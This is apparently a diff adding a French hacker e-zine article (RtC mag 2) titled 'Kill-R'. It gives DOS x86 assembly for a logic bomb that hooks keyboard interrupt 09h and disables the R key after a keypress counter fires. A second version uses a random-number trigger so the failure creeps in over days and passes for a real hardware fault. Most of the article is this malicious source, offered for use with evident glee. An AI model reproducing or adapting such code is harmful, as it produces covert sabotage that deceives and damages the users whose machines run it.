@@ -1,0 +1,119 @@
+-------[  RtC Mag, At the end of the universe  ]
+
+--------------[  La Bombe du mag : Kill-R  ]
+---------[ in RtC mag 2 ]
+----[  by Androgyne <androgyne-rtc@fr.st>  ]
+
+
+-------[  Simulation n°1
+
+	Cette fois, la bombe va simuler une panne clavier (voir l'article Virus et dommages matériels). Nous allons détourner l'interruption 09h. Ce code est un peu plus complexe qu'auparavant mais il faut savoir évoluer et aborder des domaines un peu plus hardus...
+
+	J'ai baptisé cette bombe Kill-R. Elle cause une pseudo-défaillance sur la touche R. Dans la première version ci dessous, on utilise une gachette triviale, un compteur que l'on incrémente. Après avoir appuyé sur 20000 touches (c'est à dire 20000 appels à l'interruption 09h), la bombe explose, le R devient inutilisable.
+
+--- KILL-R.ASM ----------------------------------------------------------------
+
+NEW_INT_09:
+	push ax
+	in al,60h
+	test al,80h
+	pop ax
+	jnz INT_09
+	call TRIGGER
+	jnz INT_09
+	call BOMB
+  INT_09:
+	jmp dword ptr cs:[Old_09]
+
+TRIGGER:
+	inc cs:[Counter]
+	cmp [Counter],4E20h		;counter=20000?
+	jnc NEXT
+	mov byte ptr [Activated],1
+  NEXT:
+	cmp [Activated],1
+	ret
+
+BOMB:
+	push ax
+	in al,60h
+	or al,80h
+	cmp al,43h
+	pop ax
+	jnz INT_09
+	push ax
+	mov al,20h
+	out 20h,al
+	pop ax
+	iret
+
+Counter dw 0
+Activated db 0
+
+--- KILL-R.ASM ----------------------------------------------------------------
+
+
+-------[  Simulation n°2
+
+
+	Cette première version peut être améliorée par l'ajout d'un générateur de nombres aléatoires. Le compteur démarre à M/4 (c'est à dire qu'au début, le R a 25% de chances de ne pas marcher). Puis le compteur est incrémenté à chaque touche pressée... Le R va donc mettre quelques jours à devenir inutilisable : une "vraie" panne bien simulée.
+
+
+--- GNPA.ASM ------------------------------------------------------------------
+
+;Linear Congruential Pseudo Random Number Generator
+;the equation is X(n+1) = (A*X(n) + C) mod M
+
+M equ 43691
+A equ 13
+C equ 14449
+
+GET_RANDOM:
+	push bx
+	push cx
+	push dx
+	mov ax,[Rand_Seed]
+	mov cx,A
+	mul cx
+	add ax,C
+	adc dx,0
+	mov cx,M
+	div cx
+	mov ax,dx
+	mov [Rand_Seed],ax
+	pop dx
+	pop cx
+	pop bx
+	ret
+
+Rand_Seed dw 0
+
+--- GNPA.ASM ------------------------------------------------------------------
+
+
+	Et on remplace la routine TRIGGER par celle-ci...
+
+
+--- TRIGGER.ASM ---------------------------------------------------------------
+
+TRIGGER:
+	push ax
+	call GET_RANDOM
+	inc cs:[Rand_Counter]
+	cmp [Rand_Counter],ax
+	pop ax
+	jnc NEXT:
+	mov byte ptr [Activated],1
+  NEXT:
+	cmp [Activated],1
+	ret
+
+Rand_Counter dw 10922			;=M/4
+Activated db 0
+
+--- TRIGGER.ASM ---------------------------------------------------------------
+
+    La simulation, je trouve ça encore meilleur que la réalité ! hehe !
+
+
+-------[  EOF
